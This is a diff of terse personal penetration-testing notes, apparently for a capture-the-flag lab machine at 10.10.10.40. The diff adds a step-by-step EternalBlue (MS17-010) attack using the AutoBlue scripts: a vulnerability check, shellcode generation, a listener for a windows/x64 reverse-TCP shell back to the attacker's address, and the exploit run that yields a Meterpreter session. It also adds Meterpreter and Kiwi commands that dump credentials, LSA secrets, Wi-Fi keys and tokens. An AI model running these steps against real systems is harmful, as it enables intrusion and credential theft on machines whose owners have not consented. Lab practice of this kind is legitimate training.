@@ -154,11 +154,19 @@ whoami
 hostname
 hashdump  -> crack hashcat
 
-shell
+>shell
 route print
 system32
 arp -a
 netstat -ano
+load
+kiwi 
+creds_all
+wifi_list
+lsa_dump_secrets
+load_incognito
+list_tokens -u
+
 
 set payload windows + TAB 
 set payload windows/x64/met + TAB
@@ -173,7 +181,10 @@ payload => windows/x64/shell/reverse_tcp
 
 
 Goo -> autoblue Github
-https://github.com/3ndG4me/AutoBlue-MS17-010
+git clone https://github.com/3ndG4me/AutoBlue-MS17-010
+cd /home/theone/AutoBlue-MS17-010
+python eternal_checker.py 10.10.10.40
+[!] The target is not patched == vulnerable
 
 ─# ./shell_prep.sh   
                  _.-;;-._
@@ -202,13 +213,22 @@ Type 0 to generate a staged payload or 1 to generate a stageless payload
 4446
 0
 0 -> metasploit
+generate payload
+
+
 ./listener_prep.sh
+10.10.14.29
 4445
 4446
 0
 0
+opens msf6 exploit(multi/handler) > 
 
 python eternalblue_exploit7.py 10.10.10.40 ./shellcode/sc_all.bin
+
+back to msf -> sessions
+sessions 1
+>meterpreter
 
 
 -------------------------------------------------------------------------
